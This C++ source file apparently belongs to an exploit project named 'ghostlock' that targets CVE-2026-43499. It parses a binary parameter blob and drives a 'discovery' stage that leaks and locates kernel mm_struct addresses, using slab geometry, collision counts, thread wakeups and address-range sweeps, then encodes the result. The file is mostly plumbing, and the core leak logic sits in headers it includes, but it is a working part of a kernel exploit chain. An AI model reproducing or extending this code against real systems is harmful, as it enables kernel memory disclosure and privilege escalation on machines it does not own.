#include "platform/native_discover_43499.hpp"

#include <cerrno>
#include <cstring>

#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
#include "backend/cve_2026_43499/leak/snitch_region.hpp"
#include "backend/cve_2026_43499/steps/discovery_runner.hpp"

namespace ghostlock::platform::native43499 {
    namespace {
        constexpr std::uint32_t kMagic = 0x474C4450U;
        constexpr std::uint32_t kResultMagic = 0x474C4452U;
        constexpr std::uint16_t kVersion = 1U;
        constexpr std::size_t kHeader = 120U;
        constexpr std::size_t kResultBytes = 64U;

        std::uint16_t u16(const std::uint8_t *p, std::size_t at) noexcept {
            return static_cast<std::uint16_t>(p[at]) |
                   static_cast<std::uint16_t>(static_cast<std::uint16_t>(p[at + 1U]) << 8U);
        }
        std::uint32_t u32(const std::uint8_t *p, std::size_t at) noexcept {
            return static_cast<std::uint32_t>(p[at]) |
                   (static_cast<std::uint32_t>(p[at + 1U]) << 8U) |
                   (static_cast<std::uint32_t>(p[at + 2U]) << 16U) |
                   (static_cast<std::uint32_t>(p[at + 3U]) << 24U);
        }
        std::uint64_t u64(const std::uint8_t *p, std::size_t at) noexcept {
            return static_cast<std::uint64_t>(u32(p, at)) |
                   (static_cast<std::uint64_t>(u32(p, at + 4U)) << 32U);
        }
        void put32(std::uint8_t *p, std::size_t at, std::uint32_t value) noexcept {
            for (std::size_t i = 0U; i < 4U; ++i) p[at + i] = static_cast<std::uint8_t>(value >> (8U * i));
        }
        void put64(std::uint8_t *p, std::size_t at, std::uint64_t value) noexcept {
            for (std::size_t i = 0U; i < 8U; ++i) p[at + i] = static_cast<std::uint8_t>(value >> (8U * i));
        }

        std::uint8_t refusal_code(const char *reason) noexcept {
            if (reason == nullptr) return 0U;
            if (std::strcmp(reason, "discovery-collisions-bad") == 0) return 1U;
            if (std::strcmp(reason, "discovery-hash-init-failed") == 0) return 2U;
            if (std::strcmp(reason, "discovery-words-unmapped") == 0) return 3U;
            if (std::strcmp(reason, "discovery-no-colliding-words") == 0) return 4U;
            if (std::strcmp(reason, "discovery-words-small") == 0) return 5U;
            return 99U;
        }

        std::uint8_t verdict_code(const char *verdict) noexcept {
            if (verdict == nullptr) return 0U;
            if (std::strcmp(verdict, "ok") == 0) return 1U;
            if (std::strcmp(verdict, "plan-missing") == 0) return 2U;
            if (std::strcmp(verdict, "geometry-missing") == 0) return 3U;
            if (std::strcmp(verdict, "call-failed") == 0) return 4U;
            return 99U;
        }
    }  // namespace

    bool parse_discover(const std::uint8_t *blob, std::size_t size, DiscoverParams &out,
                        std::string &error) noexcept {
        if (blob == nullptr || size < kHeader) { error = "short"; return false; }
        if (u32(blob, 0U) != kMagic) { error = "magic"; return false; }
        if (u16(blob, 4U) != kVersion) { error = "version"; return false; }
        if (u16(blob, 6U) != kHeader) { error = "header"; return false; }
        if (u32(blob, 8U) != size) { error = "total"; return false; }
        const std::uint32_t words_bytes = u32(blob, 24U);
        const std::uint32_t collisions = u32(blob, 28U);
        if (collisions == 0U || collisions > 64U) { error = "collisions"; return false; }
        const std::uint32_t threads = u32(blob, 32U);
        const std::uint32_t cpus = u32(blob, 36U);
        if (threads == 0U || cpus == 0U) { error = "threads"; return false; }
        if (u64(blob, 16U) == 0U || words_bytes == 0U) { error = "words"; return false; }
        if (u64(blob, 40U) == 0U || u64(blob, 48U) == 0U || u64(blob, 56U) == 0U) {
            error = "geometry"; return false;
        }
        if (u32(blob, 64U) == 0U || u32(blob, 68U) == 0U || u32(blob, 72U) == 0U ||
            u32(blob, 76U) == 0U) { error = "region"; return false; }
        if (u32(blob, 80U) == 0U) { error = "patience"; return false; }
        if (u64(blob, 92U) == 0U || u64(blob, 100U) == 0U || u64(blob, 92U) >= u64(blob, 100U)) {
            error = "range"; return false;
        }
        if (blob[113U] != 0U) { error = "flags"; return false; }
        out.words_address = u64(blob, 16U);
        out.words_bytes = words_bytes;
        out.collisions = collisions;
        out.thread_count = threads;
        out.possible_cpus = cpus;
        out.page_size = u64(blob, 40U);
        out.mm_struct_size = u64(blob, 48U);
        out.mm_slab_order = u64(blob, 56U);
        out.header_bytes = u32(blob, 64U);
        out.total_pokes = u32(blob, 68U);
        out.word_bytes = u32(blob, 72U);
        out.handle_bytes = u32(blob, 76U);
        out.wake_rounds = u32(blob, 80U);
        out.round_timeout_us = static_cast<std::int64_t>(u64(blob, 84U));
        out.range_start = u64(blob, 92U);
        out.range_end = u64(blob, 100U);
        out.counter_offset = u32(blob, 108U);
        out.sweep_tags = blob[112U] != 0U;
        error.clear();
        return true;
    }

    long run_discover(const DiscoverParams &params, DiscoverResult &out) noexcept {
        out = DiscoverResult{};
        using namespace ghostlock::backend::cve_2026_43499;
        leak::SnitchInputs inputs{};
        inputs.page_size = params.page_size;
        inputs.mm_struct_size = params.mm_struct_size;
        inputs.mm_slab_order = params.mm_slab_order;
        inputs.collisions = params.collisions;
        inputs.thread_count = params.thread_count;
        inputs.possible_cpus = params.possible_cpus;
        leak::SnitchSetup setup{};
        if (leak::build_snitch_setup(inputs, setup) != leak::SnitchSetupVerdict::Ok) return -EINVAL;
        leak::RegionInputs region{};
        region.header_bytes = params.header_bytes;
        region.collisions = params.collisions;
        region.thread_count = params.thread_count;
        region.total_pokes = params.total_pokes;
        region.page_size = params.page_size;
        region.word_bytes = params.word_bytes;
        region.handle_bytes = params.handle_bytes;
        steps::DiscoveryRequest request{};
        request.setup = setup;
        request.region = region;
        request.patience.wake_rounds = params.wake_rounds;
        request.patience.round_timeout_us = params.round_timeout_us;
        request.strides = setup.strides;
        request.range.start = params.range_start;
        request.range.end = params.range_end;
        request.counter_offset = params.counter_offset;
        request.sweep_tags = params.sweep_tags;
        request.words_region = reinterpret_cast<void *>(params.words_address);
        request.words_bytes = params.words_bytes;
        steps::DiscoveryOutcome outcome{};
        const char *refusal = nullptr;
        out.ran = steps::run_discovery(request, outcome, &refusal);
        out.refusal = refusal_code(refusal);
        out.verdict = verdict_code(outcome.verdict);
        out.found = outcome.found;
        out.mm_struct = outcome.mm_struct;
        out.probes = static_cast<std::uint32_t>(outcome.probes);
        out.rounds = outcome.rounds;
        out.pokes = static_cast<std::uint32_t>(outcome.pokes_wanted);
        out.error = outcome.error;
        out.words_base = reinterpret_cast<std::uint64_t>(outcome.words_base);
        out.words_bytes = static_cast<std::uint32_t>(outcome.words_bytes);
        return 0;
    }

    bool encode_discover_result(const DiscoverResult &result, std::uint8_t *out,
                                std::size_t capacity) noexcept {
        if (out == nullptr || capacity < kResultBytes) return false;
        std::memset(out, 0, kResultBytes);
        put32(out, 0U, kResultMagic);
        out[4U] = static_cast<std::uint8_t>(kVersion);
        out[6U] = 0U;
        out[8U] = result.ran ? 1U : 0U;
        out[9U] = result.verdict;
        out[10U] = result.refusal;
        put64(out, 16U, result.found);
        put64(out, 24U, result.mm_struct);
        put32(out, 32U, result.probes);
        put32(out, 36U, result.rounds);
        put32(out, 40U, result.pokes);
        put32(out, 44U, static_cast<std::uint32_t>(result.error));
        put64(out, 48U, result.words_base);
        put32(out, 56U, result.words_bytes);
        return true;
    }
}  // namespace ghostlock::platform::native43499
